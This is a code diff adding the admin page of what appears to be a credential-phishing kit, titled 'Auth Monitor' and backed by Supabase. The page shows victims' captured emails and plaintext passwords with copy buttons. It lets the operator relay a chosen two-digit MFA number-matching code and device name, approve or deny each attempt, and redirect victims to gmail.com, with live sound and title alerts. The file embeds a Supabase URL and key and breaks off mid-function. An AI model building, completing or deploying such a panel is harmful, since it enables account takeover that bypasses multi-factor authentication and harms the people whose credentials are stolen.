@@ -1,0 +1,1427 @@
+<!-- admin.html -->
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Admin Dashboard - Auth Monitor</title>
+    <link rel="shortcut icon" href="/logo.ico" type="image/x-icon" />
+    <style>
+      :root {
+        --bg: #0b1120;
+        --surface: #151d2e;
+        --surface-2: #1c263b;
+        --surface-hover: #243047;
+        --text: #e2e8f0;
+        --text-muted: #94a3b8;
+        --primary: #3b82f6;
+        --primary-hover: #2563eb;
+        --success: #22c55e;
+        --success-hover: #16a34a;
+        --danger: #ef4444;
+        --danger-hover: #dc2626;
+        --warning: #f59e0b;
+        --border: #2a3650;
+        --border-light: #364461;
+        --radius: 14px;
+        --font:
+          "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+          sans-serif;
+      }
+
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      body {
+        background:
+          radial-gradient(
+            circle at top left,
+            rgba(59, 130, 246, 0.08),
+            transparent 40%
+          ),
+          radial-gradient(
+            circle at bottom right,
+            rgba(34, 197, 94, 0.06),
+            transparent 40%
+          ),
+          var(--bg);
+        color: var(--text);
+        font-family: var(--font);
+        min-height: 100vh;
+        padding: 24px;
+      }
+
+      /* Auth screen */
+      #auth-screen {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+      }
+
+      .auth-card {
+        background: var(--surface);
+        border: 1px solid var(--border);
+        border-radius: var(--radius);
+        padding: 40px;
+        width: 100%;
+        max-width: 400px;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
+      }
+
+      .auth-card h1 {
+        font-size: 24px;
+        margin-bottom: 8px;
+        font-weight: 600;
+      }
+
+      .auth-card p {
+        color: var(--text-muted);
+        font-size: 14px;
+        margin-bottom: 24px;
+      }
+
+      .form-group {
+        margin-bottom: 16px;
+      }
+
+      .form-group label {
+        display: block;
+        font-size: 13px;
+        color: var(--text-muted);
+        margin-bottom: 6px;
+        font-weight: 500;
+      }
+
+      .form-group input {
+        width: 100%;
+        padding: 12px 14px;
+        background: var(--bg);
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        color: var(--text);
+        font-size: 14px;
+        font-family: var(--font);
+        outline: none;
+        transition: border-color 0.2s;
+      }
+
+      .form-group input:focus {
+        border-color: var(--primary);
+      }
+
+      .password-wrap {
+        position: relative;
+      }
+
+      .password-wrap input {
+        padding-right: 44px;
+      }
+
+      .eye-btn {
+        position: absolute;
+        right: 8px;
+        top: 50%;
+        transform: translateY(-50%);
+        background: transparent;
+        border: none;
+        color: var(--text-muted);
+        cursor: pointer;
+        padding: 6px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 6px;
+      }
+
+      .eye-btn:hover {
+        color: var(--text);
+        background: var(--surface-2);
+      }
+
+      .eye-btn svg {
+        width: 18px;
+        height: 18px;
+      }
+
+      .btn {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        padding: 10px 18px;
+        border: none;
+        border-radius: 8px;
+        font-size: 14px;
+        font-weight: 600;
+        font-family: var(--font);
+        cursor: pointer;
+        transition:
+          background 0.2s,
+          transform 0.1s;
+      }
+
+      .btn:active {
+        transform: scale(0.97);
+      }
+      .btn-primary {
+        background: var(--primary);
+        color: white;
+      }
+      .btn-primary:hover {
+        background: var(--primary-hover);
+      }
+      .btn-success {
+        background: var(--success);
+        color: white;
+      }
+      .btn-success:hover {
+        background: var(--success-hover);
+      }
+      .btn-danger {
+        background: var(--danger);
+        color: white;
+      }
+      .btn-danger:hover {
+        background: var(--danger-hover);
+      }
+      .btn-ghost {
+        background: var(--surface-2);
+        color: var(--text);
+        border: 1px solid var(--border);
+      }
+      .btn-ghost:hover {
+        background: var(--surface-hover);
+      }
+      .btn-block {
+        width: 100%;
+      }
+      .btn:disabled {
+        opacity: 0.5;
+        cursor: not-allowed;
+      }
+      .btn-sm {
+        padding: 6px 12px;
+        font-size: 12px;
+      }
+
+      .error-msg {
+        color: var(--danger);
+        font-size: 13px;
+        margin-top: 12px;
+        display: none;
+      }
+
+      /* Dashboard */
+      #dashboard {
+        display: none;
+      }
+
+      .topbar {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-bottom: 24px;
+        padding-bottom: 16px;
+        border-bottom: 1px solid var(--border);
+        flex-wrap: wrap;
+        gap: 16px;
+      }
+
+      .topbar-left h1 {
+        font-size: 22px;
+        font-weight: 700;
+        letter-spacing: -0.3px;
+      }
+
+      .topbar .user-info {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        font-size: 13px;
+        color: var(--text-muted);
+      }
+
+      .live-indicator {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        font-size: 12px;
+        color: var(--success);
+        margin-top: 4px;
+      }
+
+      .live-dot {
+        width: 8px;
+        height: 8px;
+        background: var(--success);
+        border-radius: 50%;
+        animation: pulse 1.5s infinite;
+      }
+
+      @keyframes pulse {
+        0%,
+        100% {
+          opacity: 1;
+          box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.4);
+        }
+        50% {
+          opacity: 0.6;
+          box-shadow: 0 0 0 6px rgba(34, 197, 94, 0);
+        }
+      }
+
+      .toolbar {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        flex-wrap: wrap;
+        margin-bottom: 20px;
+      }
+
+      .toolbar .stat {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        background: var(--surface);
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        padding: 8px 12px;
+        font-size: 13px;
+        color: var(--text-muted);
+      }
+      .toolbar .stat strong {
+        color: var(--text);
+        font-weight: 600;
+      }
+
+      .mute-btn {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        background: var(--surface);
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        padding: 8px 12px;
+        font-size: 13px;
+        color: var(--text-muted);
+        cursor: pointer;
+        font-family: var(--font);
+        transition: all 0.2s;
+      }
+      .mute-btn:hover {
+        background: var(--surface-hover);
+        color: var(--text);
+      }
+      .mute-btn.muted {
+        color: var(--danger);
+        border-color: rgba(239, 68, 68, 0.4);
+      }
+      .mute-btn svg {
+        width: 16px;
+        height: 16px;
+      }
+
+      .sessions-grid {
+        display: grid;
+        gap: 16px;
+      }
+
+      .session-card {
+        background: var(--surface);
+        border: 1px solid var(--border);
+        border-radius: var(--radius);
+        padding: 20px;
+        transition:
+          border-color 0.2s,
+          box-shadow 0.2s;
+      }
+
+      .session-card.pending {
+        border-color: var(--warning);
+        box-shadow:
+          0 0 0 1px var(--warning),
+          0 4px 24px rgba(245, 158, 11, 0.15);
+        animation: pendingPulse 2s infinite;
+      }
+
+      @keyframes pendingPulse {
+        0%,
+        100% {
+          box-shadow:
+            0 0 0 1px var(--warning),
+            0 4px 24px rgba(245, 158, 11, 0.15);
+        }
+        50% {
+          box-shadow:
+            0 0 0 1px var(--warning),
+            0 4px 32px rgba(245, 158, 11, 0.3);
+        }
+      }
+
+      .session-header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-bottom: 16px;
+        flex-wrap: wrap;
+        gap: 12px;
+      }
+
+      .session-email {
+        font-size: 16px;
+        font-weight: 600;
+      }
+
+      .badge {
+        display: inline-block;
+        padding: 4px 10px;
+        border-radius: 20px;
+        font-size: 11px;
+        font-weight: 600;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+      }
+
+      .badge-pending {
+        background: rgba(245, 158, 11, 0.2);
+        color: var(--warning);
+      }
+      .badge-approved {
+        background: rgba(34, 197, 94, 0.2);
+        color: var(--success);
+      }
+      .badge-denied {
+        background: rgba(239, 68, 68, 0.2);
+        color: var(--danger);
+      }
+      .badge-email {
+        background: rgba(148, 163, 184, 0.2);
+        color: var(--text-muted);
+      }
+      .badge-redirected {
+        background: rgba(59, 130, 246, 0.2);
+        color: var(--primary);
+      }
+
+      .session-info {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        gap: 12px;
+        margin-bottom: 16px;
+        font-size: 14px;
+      }
+
+      .info-item {
+        display: flex;
+        flex-direction: column;
+        gap: 4px;
+      }
+
+      .info-item .label {
+        font-size: 11px;
+        text-transform: uppercase;
+        color: var(--text-muted);
+        font-weight: 600;
+        letter-spacing: 0.5px;
+      }
+
+      .value-row {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+      }
+
+      .info-item .value {
+        font-size: 14px;
+        word-break: break-all;
+        flex: 1;
+      }
+
+      .info-item .value.mono {
+        font-family: "SF Mono", "Consolas", monospace;
+        background: var(--bg);
+        padding: 6px 10px;
+        border-radius: 6px;
+        border: 1px solid var(--border);
+      }
+
+      .copy-btn {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        width: 30px;
+        height: 30px;
+        flex: 0 0 auto;
+        background: var(--surface-2);
+        border: 1px solid var(--border);
+        border-radius: 6px;
+        color: var(--text-muted);
+        cursor: pointer;
+        transition: all 0.15s;
+      }
+
+      .copy-btn:hover {
+        background: var(--surface-hover);
+        color: var(--text);
+        border-color: var(--border-light);
+      }
+
+      .copy-btn svg {
+        width: 14px;
+        height: 14px;
+      }
+
+      .copy-btn.copied {
+        color: var(--success);
+        border-color: var(--success);
+      }
+
+      .approve-section {
+        background: var(--bg);
+        border-radius: 10px;
+        padding: 16px;
+        margin-top: 12px;
+        border: 1px solid var(--border);
+      }
+
+      .approve-section h4 {
+        font-size: 12px;
+        text-transform: uppercase;
+        color: var(--text-muted);
+        margin-bottom: 12px;
+        letter-spacing: 0.5px;
+        font-weight: 600;
+      }
+
+      .number-grid {
+        display: grid;
+        grid-template-columns: repeat(10, 1fr);
+        gap: 4px;
+        margin-bottom: 12px;
+      }
+
+      .num-btn {
+        padding: 8px 0;
+        background: var(--surface);
+        border: 1px solid var(--border);
+        border-radius: 6px;
+        color: var(--text);
+        font-size: 12px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.15s;
+        font-family: var(--font);
+      }
+
+      .num-btn:hover {
+        background: var(--surface-hover);
+      }
+
+      .num-btn.selected {
+        background: var(--primary);
+        border-color: var(--primary);
+        color: white;
+        box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.3);
+      }
+
+      .device-input {
+        width: 100%;
+        padding: 10px 12px;
+        background: var(--surface);
+        border: 1px solid var(--border);
+        border-radius: 6px;
+        color: var(--text);
+        font-size: 14px;
+        font-family: var(--font);
+        outline: none;
+        margin-bottom: 12px;
+      }
+
+      .device-input:focus {
+        border-color: var(--primary);
+      }
+
+      .action-buttons {
+        display: flex;
+        gap: 8px;
+        flex-wrap: wrap;
+      }
+
+      .redirect-section {
+        margin-top: 12px;
+        padding-top: 12px;
+        border-top: 1px solid var(--border);
+      }
+
+      .redirect-input-row {
+        display: flex;
+        gap: 8px;
+        margin-top: 8px;
+      }
+
+      .redirect-input-row input {
+        flex: 1;
+        padding: 10px 12px;
+        background: var(--surface);
+        border: 1px solid var(--border);
+        border-radius: 6px;
+        color: var(--text);
+        font-size: 14px;
+        font-family: var(--font);
+        outline: none;
+      }
+
+      .redirect-input-row input:focus {
+        border-color: var(--primary);
+      }
+
+      .empty-state {
+        text-align: center;
+        padding: 60px 20px;
+        color: var(--text-muted);
+      }
+
+      .empty-state svg {
+        width: 48px;
+        height: 48px;
+        margin-bottom: 16px;
+        opacity: 0.5;
+      }
+
+      .timestamp {
+        font-size: 12px;
+        color: var(--text-muted);
+      }
+
+      .toast {
+        position: fixed;
+        bottom: 24px;
+        right: 24px;
+        background: var(--surface);
+        border: 1px solid var(--border);
+        border-radius: 10px;
+        padding: 12px 20px;
+        font-size: 14px;
+        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+        transform: translateY(100px);
+        opacity: 0;
+        transition: all 0.3s;
+        z-index: 1000;
+      }
+
+      .toast.show {
+        transform: translateY(0);
+        opacity: 1;
+      }
+
+      .toast.success {
+        border-left: 3px solid var(--success);
+      }
+      .toast.error {
+        border-left: 3px solid var(--danger);
+      }
+      .toast.info {
+        border-left: 3px solid var(--primary);
+      }
+
+      @media (max-width: 600px) {
+        .number-grid {
+          grid-template-columns: repeat(5, 1fr);
+        }
+        .topbar {
+          flex-direction: column;
+          align-items: flex-start;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Auth Screen -->
+    <div id="auth-screen">
+      <div class="auth-card">
+        <h1>Admin Login</h1>
+        <p>Sign in to monitor authentication sessions.</p>
+        <div class="form-group">
+          <label for="login-email">Email</label>
+          <input
+            type="email"
+            id="login-email"
+            placeholder="admin@example.com"
+            autocomplete="username"
+          />
+        </div>
+        <div class="form-group">
+          <label for="login-password">Password</label>
+          <div class="password-wrap">
+            <input
+              type="password"
+              id="login-password"
+              placeholder="••••••••"
+              autocomplete="current-password"
+            />
+            <button
+              type="button"
+              class="eye-btn"
+              onclick="toggleLoginPassword()"
+              aria-label="Toggle password visibility"
+            >
+              <svg
+                id="eye-icon"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              >
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                <circle cx="12" cy="12" r="3"></circle>
+              </svg>
+            </button>
+          </div>
+        </div>
+        <button
+          class="btn btn-primary btn-block"
+          onclick="handleLogin()"
+          id="login-btn"
+        >
+          Sign In
+        </button>
+        <div class="error-msg" id="login-error"></div>
+      </div>
+    </div>
+
+    <!-- Dashboard -->
+    <div id="dashboard">
+      <div class="topbar">
+        <div class="topbar-left">
+          <h1>Auth Monitor</h1>
+          <div class="live-indicator">
+            <div class="live-dot"></div>
+            Live — real-time updates
+          </div>
+        </div>
+        <div class="user-info">
+          <span id="admin-email-display"></span>
+          <a
+            href="records.html"
+            class="btn btn-ghost btn-sm"
+            style="text-decoration: none"
+            >Records</a
+          >
+          <button class="btn btn-danger btn-sm" onclick="handleLogout()">
+            Sign Out
+          </button>
+        </div>
+      </div>
+
+      <div class="toolbar">
+        <div class="stat">
+          <strong id="active-count">0</strong> active session(s)
+        </div>
+        <div class="stat"><strong id="pending-count">0</strong> pending</div>
+        <button
+          class="mute-btn"
+          id="mute-btn"
+          onclick="toggleMute()"
+          title="Toggle notification sound"
+        >
+          <svg
+            id="sound-icon"
+            viewBox="0 0 24 24"
+            fill="none"
+            stroke="currentColor"
+            stroke-width="2"
+            stroke-linecap="round"
+            stroke-linejoin="round"
+          >
+            <polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon>
+            <path
+              d="M19.07 4.93a10 10 0 0 1 0 14.14M15.54 8.46a5 5 0 0 1 0 7.07"
+            ></path>
+          </svg>
+          <span id="mute-label">Sound On</span>
+        </button>
+        <button
+          class="btn btn-ghost btn-sm"
+          onclick="requestNotificationPermission()"
+          id="notif-btn"
+        >
+          Enable Notifications
+        </button>
+      </div>
+
+      <div class="sessions-grid" id="sessions-container">
+        <div class="empty-state">
+          <svg
+            viewBox="0 0 24 24"
+            fill="none"
+            stroke="currentColor"
+            stroke-width="2"
+          >
+            <circle cx="12" cy="12" r="10"></circle>
+            <path d="M12 8v4l3 3"></path>
+          </svg>
+          <p>Waiting for authentication sessions...</p>
+          <p style="font-size: 13px; margin-top: 8px">
+            Sessions will appear here in real time.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div class="toast" id="toast"></div>
+
+    <!-- admin.html — REPLACE only the <script> block at the bottom -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script>
+      // ====== SUPABASE CONFIG ======
+      const SUPABASE_URL = "https://jvxlknzzpgfircioqlzd.supabase.co";
+      const SUPABASE_ANON_KEY =
+        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imp2eGxrbnp6cGdmaXJjaW9xbHpkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTUwMTMyMTMsImV4cCI6MjExMDU4OTIxM30.zwGoVZ9rup1I-NhhYBsrbQYMJ_tg0Vk39JYlhG5Lbg4";
+
+      const sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+      // ====== STATE ======
+      let currentUser = null;
+      let realtimeChannel = null;
+      let allSessions = [];
+      let isMuted = localStorage.getItem("auth_monitor_muted") === "true";
+      let audioCtx = null;
+      let knownSessionIds = new Set();
+      let firstLoad = true;
+      let titleInterval = null;
+      let originalTitle = document.title;
+
+      // Looping beep state
+      let beepInterval = null;
+      let beepingActive = false;
+
+      // ====== AUDIO UNLOCK ======
+      // Must be called synchronously inside a real user gesture.
+      // Creates the AudioContext (if needed), calls resume() directly, and
+      // schedules a tiny inaudible oscillator so the browser marks the
+      // context as "activated" for this document.
+      function unlockAudio() {
+        try {
+          if (!audioCtx) {
+            const Ctx = window.AudioContext || window.webkitAudioContext;
+            if (!Ctx) return;
+            audioCtx = new Ctx();
+          }
+          // Synchronously request resume inside the gesture.
+          if (audioCtx.state === "suspended") {
+            audioCtx.resume();
+          }
+          // Also schedule a silent oscillator — some browsers only mark the
+          // context activated once something is actually started on it.
+          const now = audioCtx.currentTime;
+          const osc = audioCtx.createOscillator();
+          const gain = audioCtx.createGain();
+          gain.gain.value = 0.00001; // essentially silent, but non-zero
+          osc.frequency.value = 440;
+          osc.connect(gain);
+          gain.connect(audioCtx.destination);
+          osc.start(now);
+          osc.stop(now + 0.02);
+        } catch (e) {
+          console.warn("Audio unlock failed:", e);
+        }
+      }
+
+      // Attach gesture listeners once at startup. Any click/keydown/touch
+      // anywhere unlocks audio for the rest of the session.
+      ["click", "keydown", "touchstart"].forEach((evt) => {
+        window.addEventListener(evt, unlockAudio, { passive: true });
+      });
+
+      // ====== AUTH ======
+      async function handleLogin() {
+        // Call synchronously inside the click handler — critical for unlock.
+        unlockAudio();
+
+        const email = document.getElementById("login-email").value.trim();
+        const password = document.getElementById("login-password").value;
+        const errEl = document.getElementById("login-error");
+        const btn = document.getElementById("login-btn");
+
+        errEl.style.display = "none";
+        btn.disabled = true;
+        btn.textContent = "Signing in...";
+
+        const { data, error } = await sb.auth.signInWithPassword({
+          email,
+          password,
+        });
+
+        if (error) {
+          errEl.textContent = error.message;
+          errEl.style.display = "block";
+          btn.disabled = false;
+          btn.textContent = "Sign In";
+          return;
+        }
+
+        currentUser = data.user;
+        showDashboard();
+      }
+
+      async function handleLogout() {
+        stopBeeping();
+        await sb.auth.signOut();
+        currentUser = null;
+        if (realtimeChannel) {
+          sb.removeChannel(realtimeChannel);
+          realtimeChannel = null;
+        }
+        document.getElementById("dashboard").style.display = "none";
+        document.getElementById("auth-screen").style.display = "flex";
+        document.getElementById("login-password").value = "";
+        document.title = originalTitle;
+      }
+
+      function toggleLoginPassword() {
+        const input = document.getElementById("login-password");
+        input.type = input.type === "password" ? "text" : "password";
+      }
+
+      function showDashboard() {
+        document.getElementById("auth-screen").style.display = "none";
+        document.getElementById("dashboard").style.display = "block";
+        document.getElementById("admin-email-display").textContent =
+          currentUser.email;
+        updateMuteUI();
+        loadSessions();
+        subscribeToSessions();
+      }
+
+      // ====== SESSIONS ======
+      async function loadSessions() {
+        const { data, error } = await sb
+          .from("auth_sessions")
+          .select("*")
+          .order("created_at", { ascending: false })
+          .limit(100);
+
+        if (error) {
+          console.error("Error loading sessions:", error);
+          return;
+        }
+
+        const active = (data || []).filter(
+          (s) => s.status !== "redirect" && s.status !== "denied",
+        );
+
+        if (!firstLoad) {
+          for (const s of active) {
+            if (!knownSessionIds.has(s.id)) {
+              notifyNewSession(s);
+            }
+          }
+        }
+        active.forEach((s) => knownSessionIds.add(s.id));
+        firstLoad = false;
+
+        allSessions = active;
+        renderSessions(active);
+        updateCounts();
+        syncBeepState();
+      }
+
+      function updateCounts() {
+        const total = allSessions.length;
+        const awaiting = allSessions.filter(
+          (s) => s.status === "email_entered" || s.status === "pending",
+        ).length;
+        document.getElementById("active-count").textContent = total;
+        document.getElementById("pending-count").textContent = awaiting;
+
+        if (awaiting > 0 && document.hidden) {
+          startTitleFlash(awaiting);
+        } else {
+          stopTitleFlash();
+        }
+      }
+
+      function startTitleFlash(pending) {
+        if (titleInterval) return;
+        let on = false;
+        titleInterval = setInterval(() => {
+          on = !on;
+          document.title = on ? `(${pending}) New session!` : originalTitle;
+        }, 1000);
+      }
+
+      function stopTitleFlash() {
+        if (titleInterval) {
+          clearInterval(titleInterval);
+          titleInterval = null;
+          document.title = originalTitle;
+        }
+      }
+
+      function renderSessions(sessions) {
+        const container = document.getElementById("sessions-container");
+        if (!sessions || sessions.length === 0) {
+          container.innerHTML = `
+            <div class="empty-state">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="10"></circle>
+                    <path d="M12 8v4l3 3"></path>
+                </svg>
+                <p>No active sessions.</p>
+                <p style="font-size:13px;margin-top:8px;">New sign-in attempts will appear here in real time.</p>
+            </div>`;
+          return;
+        }
+
+        container.innerHTML = sessions
+          .map((s) => renderSessionCard(s))
+          .join("");
+      }
+
+      function renderSessionCard(session) {
+        const isPending = session.status === "pending";
+        const badgeClass =
+          {
+            pending: "badge-pending",
+            approved: "badge-approved",
+            denied: "badge-denied",
+            email_entered: "badge-email",
+            redirect: "badge-redirected",
+          }[session.status] || "badge-email";
+
+        const badgeText =
+          {
+            pending: "Pending",
+            approved: "Approved",
+            denied: "Denied",
+            email_entered: "Email Entered",
+            redirect: "Redirected",
+          }[session.status] || session.status;
+
+        let actionsHtml = "";
+
+        if (isPending) {
+          actionsHtml = `
+            <div class="approve-section">
+                <h4>Approve Options</h4>
+                <div class="number-grid" id="num-grid-${session.id}">
+                    ${Array.from({ length: 100 }, (_, i) => {
+                      const n = String(i).padStart(2, "0");
+                      return `<button class="num-btn" data-num="${n}" onclick="selectNumber('${session.id}', '${n}')">${n}</button>`;
+                    }).join("")}
+                </div>
+                <input type="text" class="device-input" id="device-input-${session.id}" placeholder="Device name (default: Device)">
+                <div class="action-buttons">
+                    <button class="btn btn-success" onclick="approveSession('${session.id}')">Approve</button>
+                    <button class="btn btn-danger" onclick="denySession('${session.id}')">Deny</button>
+                </div>
+            </div>
+        `;
+        } else if (session.status === "approved") {
+          actionsHtml = `
+            <div class="redirect-section">
+                <h4 style="font-size:12px;text-transform:uppercase;color:var(--text-muted);margin-bottom:8px;letter-spacing:0.5px;font-weight:600;">Redirect User</h4>
+                <div class="redirect-input-row">
+                    <input type="text" id="redirect-url-${session.id}" placeholder="https://gmail.com" value="${escapeHtml(session.redirect_url || "https://gmail.com")}">
+                    <button class="btn btn-primary" onclick="redirectSession('${session.id}')">Redirect</button>
+                </div>
+            </div>
+        `;
+        }
+
+        const emailVal = session.email || "Unknown";
+        const passVal = session.password || "";
+        const emailCopyId = `copy-email-${session.id}`;
+        const passCopyId = `copy-pass-${session.id}`;
+
+        return `
+        <div class="session-card ${isPending ? "pending" : ""}" id="session-${session.id}">
+            <div class="session-header">
+                <div>
+                    <div class="session-email">${escapeHtml(emailVal)}</div>
+                    <div class="timestamp">${new Date(session.created_at).toLocaleString()}</div>
+                </div>
+                <span class="badge ${badgeClass}">${badgeText}</span>
+            </div>
+            <div class="session-info">
+                <div class="info-item">
+                    <span class="label">Email</span>
+                    <div class="value-row">
+                        <span class="value mono" id="email-value-${session.id}">${escapeHtml(emailVal)}</span>
+                        <button class="copy-btn" id="${emailCopyId}" onclick="copyText('${escapeAttr(emailVal)}', '${emailCopyId}')" title="Copy email">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                        </button>
+                    </div>
+                </div>
+                <div class="info-item">
+                    <span class="label">Password</span>
+                    <div class="value-row">
+                        <span class="value mono" id="pass-value-${session.id}">${passVal ? escapeHtml(passVal) : "—"}</span>
+                        ${
+                          passVal
+                            ? `<button class="copy-btn" id="${passCopyId}" onclick="copyText('${escapeAttr(passVal)}', '${passCopyId}')" title="Copy password">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                        </button>`
+                            : ""
+                        }
+                    </div>
+                </div>
+                <div class="info-item">
+                    <span class="label">2FA Number</span>
+                    <span class="value mono">${session.twofa_number || "—"}</span>
+                </div>
+                <div class="info-item">
+                    <span class="label">Device</span>
+                    <span class="value">${escapeHtml(session.device_name || "Device")}</span>
+                </div>
+            </div>
+            ${actionsHtml}
+        </div>
+    `;
+      }
+
+      function escapeHtml(str) {
+        if (str === null || str === undefined) return "";
+        const div = document.createElement("div");
+        div.textContent = String(str);
+        return div.innerHTML;
+      }
+
+      function escapeAttr(str) {
+        if (str === null || str === undefined) return "";
+        return String(str)
+          .replace(/\\/g, "\\\\")
+          .replace(/'/g, "\\'")
+          .replace(/"/g, '\\"')
+          .replace(/\n/g, "\\n")
+          .replace(/\r/g, "\\r");
+      }
+
+      // ====== COPY ======
+      async function copyText(text, btnId) {
+        try {
+          if (navigator.clipboard && window.isSecureContext) {
+            await navigator.clipboard.writeText(text);
+          } else {
+            const ta = document.createElement("textarea");
+            ta.value = text;
+            ta.style.position = "fixed";
+            ta.style.opacity = "0";
+            document.body.appendChild(ta);
+            ta.select();
+            document.execCommand("copy");
+            document.body.removeChild(ta);
+          }
+          const btn = document.getElementById(btnId);
+          if (btn) {
+            btn.classList.add("copied");
+            const original = btn.innerHTML;
+            btn.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>`;
+            setTimeout(() => {
+              btn.classList.remove("copied");
+              btn.innerHTML = original;
+            }, 1200);
+          }
+          showToast("Copied to clipboard", "info");
+        } catch (err) {
+          console.error("Copy failed:", err);
+          showToast("Copy failed", "error");
+        }
+      }
+
+      // ====== ACTIONS ======
+      function selectNumber(sessionId, num) {
+        const grid = document.getElementById(`num-grid-${sessionId}`);
+        if (!grid) return;
+        grid
+          .querySelectorAll(".num-btn")
+          .forEach((btn) => btn.classList.remove("selected"));
+        const target = grid.querySelector(`[data-num="${num}"]`);
+        if (target) target.classList.add("selected");
+      }
+
+      async function approveSession(sessionId) {
+        const grid = document.getElementById(`num-grid-${sessionId}`);
+        const selected = grid ? grid.querySelector(".num-btn.selected") : null;
+        const num = selected ? selected.dataset.num : "35";
+        const deviceInput = document.getElementById(
+          `device-input-${sessionId}`,
+        );
+        const device =
+          deviceInput && deviceInput.value.trim()
+            ? deviceInput.value.trim()
+            : "Device";
+
+        const { error } = await sb
+          .from("auth_sessions")
+          .update({
+            status: "approved",
+            twofa_number: num,
+            device_name: device,
+            updated_at: new Date().toISOString(),
+          })
+          .eq("id", sessionId);
+
+        if (error) {
+          showToast("Error approving: " + error.message, "error");
+        } else {
+          showToast(
+            "Approved — number " + num + ", device: " + device,
+            "success",
+          );
+        }
+      }
+
+      async function denySession(sessionId) {
+        const { error } = await sb
+          .from("auth_sessions")
+          .update({
+            status: "denied",
+            updated_at: new Date().toISOString(),
+          })
+          .eq("id", sessionId);
+
+        if (error) {
+          showToast("Error denying: " + error.message, "error");
+        } else {
+          showToast("Session denied.", "success");
+        }
+      }
+
+      async function redirectSession(sessionId) {
+        const input = document.getElementById(`redirect-url-${sessionId}`);
+        const url =
+          input && input.value.trim()
+            ? input.value.trim()
+            : "https://gmail.com";
+
+        const { error } = await sb
+          .from("auth_sessions")
+          .update({
+            status: "redirect",
+            redirect_url: url,
+            updated_at: new Date().toISOString(),
+          })
+          .eq("id", sessionId);
+
+        if (error) {
+          showToast("Error redirecting: " + error.message, "error");
+        } else {
+          showToast("Redirect command sent.", "success");
+        }
+      }
+
+      // ====== REALTIME ======
+      function subscribeToSessions() {
+        if (realtimeChannel) {
+          sb.removeChannel(realtimeChannel);
+        }
+
+        realtimeChannel = sb
+          .channel("admin-sessions")
+          .on(
+            "postgres_changes",
+            {
+              event: "*",
+              schema: "public",
+              table: "auth_sessions",
+            },
+            (payload) => {
+              console.log("Realtime event:", payload.eventType, payload.new);
+              loadSessions();
+            },
+          )
+          .subscribe();
+      }
+
+      // ====== NOTIFICATIONS ======
+      function playBeepOnce() {
+        if (isMuted) return;
+        try {
+          if (!audioCtx) {
+            const Ctx = window.AudioContext || window.webkitAudioContext;
+            if (!Ctx) {
+              console.warn("WebAudio unsupported");
+              return;
+            }
+            audioCtx = new Ctx();
+          }
+          if (audioCtx.state === "suspended") {
+            audioCtx.resume().catch(() => {});
+          }
+          const now = audioCtx.currentTime;
+          [0, 0.18].forEach((offset, i) => {
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.type = "sine";
+            osc.frequency.value = i === 0 ? 880 : 1100;
+            gain.gain.setValueAtTime(0.0001, now + offset);
+            gain.gain.exponentialRampToValueAtTime(0.25, now + offset + 0.02);
+            gain.gain.exponentialRampToValueAtTime(0.0001, now + offset + 0.16);
+            osc.connect(gain);
+            gain.connect(audioCtx.destination);
+            osc.start(now + offset);
+            osc.stop(now + offset + 0.18);
+          });
+        } catch (e) {
+          console.warn("Beep failed:", e);
+        }
+      }
+
+      function startBeeping() {
+        if (isMuted) return;
